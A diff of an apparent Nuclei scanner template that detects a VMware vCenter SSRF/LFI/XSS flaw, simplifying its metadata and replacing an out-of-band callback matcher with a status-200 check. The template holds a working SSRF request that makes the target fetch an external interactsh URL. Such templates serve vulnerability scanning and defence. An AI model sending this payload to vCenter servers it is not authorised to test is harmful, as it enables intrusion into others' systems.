@@ -1,17 +1,14 @@
 id: vmware-vcenter-ssrf
 
 info:
-  name: VMware vCenter - Server-Side Request Forgery/Local File Inclusion/Cross-Site Scripting
+  name: VMware vCenter SSRF/LFI/XSS
   author: pdteam
   severity: critical
-  description: VMware vCenter 7.0.2.00100 is susceptible to multiple vulnerabilities including server-side request forgery, local file inclusion, and cross-site scripting.
   reference:
     - https://github.com/l0ggg/VMware_vCenter
   tags: ssrf,lfi,xss,oast,vcenter,vmware
-  metadata:
-    max-request: 1
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=https://{{interactsh-url}}"
@@ -23,7 +20,6 @@ http:
         words:
           - "http"
 
-      - type: word
-        part: interactsh_request
-        words:
-          - "User-Agent: Java"
+      - type: status
+        status:
+          - 200
